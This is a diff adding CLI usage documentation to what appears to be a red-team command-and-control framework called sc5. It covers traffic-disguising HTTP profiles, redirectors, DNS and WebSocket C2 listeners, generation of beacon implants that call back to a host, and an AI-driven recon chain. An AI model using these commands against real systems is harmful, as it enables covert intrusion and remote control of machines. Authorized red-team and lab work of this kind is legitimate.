@@ -98,3 +98,70 @@ sc5 policy get
 ```bash
 sc5 repl
 ```
+
+## Malleable HTTP profiles
+
+```bash
+sc5 profiles list
+sc5 profiles activate prof_amazon_cdn
+sc5 payloads generate http_beacon_python <HOST> 8443 --profile prof_amazon_cdn --raw
+# Implant posts to profile URIs (e.g. /v1/telemetry) with wrapped body
+```
+
+HTTPS via redirector:
+
+```bash
+sc5 payloads generate http_beacon_python <CDN_HOST> 443 --scheme https --raw
+sc5 redirector --server-name cdn.example --uris /v1/telemetry,/api/v1/implant/beacon --raw
+```
+
+Lab cert helper (host with certbot): `scripts/acme_lab_renew.sh` with `DOMAINS=... EMAIL=...`.
+
+## DNS C2
+
+```bash
+sc5 listeners create dns1 5353 --kind dns --zone c2.lab.invalid --host 0.0.0.0
+sc5 listeners start <id>
+sc5 payloads generate dns_beacon_python <DNS_HOST> 5353 --zone c2.lab.invalid --raw
+```
+
+Point lab zone NS/records at the C2 host (authorized lab only).
+
+## WebSocket C2
+
+```bash
+sc5 payloads generate ws_beacon_python <HOST> 8443 --raw
+# optional TLS termination: --scheme wss and proxy wss to the server
+```
+
+Server path: `/ws/v1/beacon` (or WS profile path). Client needs `websocket-client`.
+
+## Implants
+
+```bash
+sc5 implants families
+sc5 implants generate dns_beacon <HOST> 5353 --raw
+sc5 implants generate linux_memfd <HOST> 8443 --raw
+sc5 implants generate bof <HOST> 8443 --platform windows --raw
+```
+
+## Teams / collab
+
+```bash
+sc5 teams create red-cell
+sc5 teams members <team_id>
+sc5 teams add-member <team_id> operator-b --role operator
+```
+
+## AI chains
+
+```bash
+sc5 playbooks
+sc5 chain recon_then_classify --data "windows domain lab"
+```
+
+## Report export
+
+```bash
+sc5 report --raw > engagement-report.md
+```
